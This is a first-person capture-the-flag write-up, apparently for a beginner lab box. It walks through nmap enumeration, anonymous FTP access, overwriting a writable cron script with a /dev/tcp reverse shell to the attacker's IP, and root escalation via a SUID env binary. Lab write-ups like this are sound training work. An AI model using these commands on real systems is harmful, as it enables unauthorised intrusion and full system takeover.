**Tristan Gomez**

# Anonymous
```
Try to get the two flags! 
Root the machine and prove your understanding of the fundamentals! 
This is a virtual machine meant for beginners. 
Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.
```


I began the challenge with an nmap scan, finding four open ports. 
```
└─$ sudo nmap -Pn 10.10.33.63                                                                               
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-03 12:48 PDT
Nmap scan report for 10.10.33.63
Host is up (0.22s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```
a) `Enumerate the machine.  How many ports are open?`
* 4 ports are open

b) `What service is running on port 21?`
* ftp

Then I attempted anonymous ftp to see what I could find. It's always good to check anonymous ftp first imo. It's a quick, low-hanging fruit that can have a lot of potential.

*Remember:* Anonymous ftp uses the credentials `anonymous:password`.
```
└─$ ftp
ftp> open 10.10.33.63
Connected to 10.10.33.63.
220 NamelessOne's FTP Server!
Name (10.10.33.63:gomez22): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
```

In the ftp directory, I found a `scripts` directory. Looking at the permissions...
```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
```


We can see that the scripts directory is writeable. Hmm, weird. In the scripts directory, I found clean.sh, removed_files.log, and to_do.txt. Looking at the permissions again...
```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1032 Dec 20 20:43 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```
It looks like only clean.sh is writeable, but we appear to be able to add files to this directory. Lets take a peek in all the files.

In `to_do.txt` was...`I really need to disable the anonymous login...it's really not safe`. Well, this isn't super helpful, but at least they realize that this is a hole in their security.

In `removed_files.log` was...
```
└─$ cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```
Hmm, a lot of nothing?


Finally, in `clean.sh`
```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
So, let's put this all together. `clean.sh` is writeable, and it looks like it contains a bash script to remove files. Then the removed files are logged in `removed_files.log`, but there doesn't appear to have been any files deleted. There are a ton of `nothing to delete` messages in `removed_files.log`. This indicates to me that the shell script in running periodically. Since it's writeable, I think that I could alter it to send a reverse shell to my machine, giving me a foothold. Let's try it out!

I cleared out clean.sh and put in `/bin/bash -l > /dev/tcp/10.8.248.108/1111 0<&1 2>&1`.
I opened up a netcat listener on port 1111 and...
```
└─$ nc -nvlp 1111
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1111
Ncat: Listening on 0.0.0.0:1111
Ncat: Connection from 10.10.119.150.
Ncat: Connection from 10.10.119.150:39932.
ls
pics
user.txt
python3 --version
Python 3.6.9
```

We're in! Let's spin up a pseudo shell with Python. 
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

```
namelessone@anonymous:~$ whoami
whoami
namelessone
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
```
Now we have the user flag, but we need to privesc to find the root flag. I ran `find / -user root -perm -4000 -exec ls -ldb {} \;` to find binaries with the suid bit set. It looks like we have some choices, so I am going to consult `gtfobins` to see what I can exploit.
```
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
...
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
...
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 35000 Jan 18  2018 /usr/bin/env
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
```

After a few tries the exploit that worked for me was with `env`

```
namelessone@anonymous:~$ env /bin/sh -p
env /bin/sh -p
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
4d930091c31a622a7ed10f27999af363
#
```

And that's all she wrote! This was a fun one. I learned a lot. Before this challenge, I had not considered writing to an ftp directory, so now that option is in my playbook!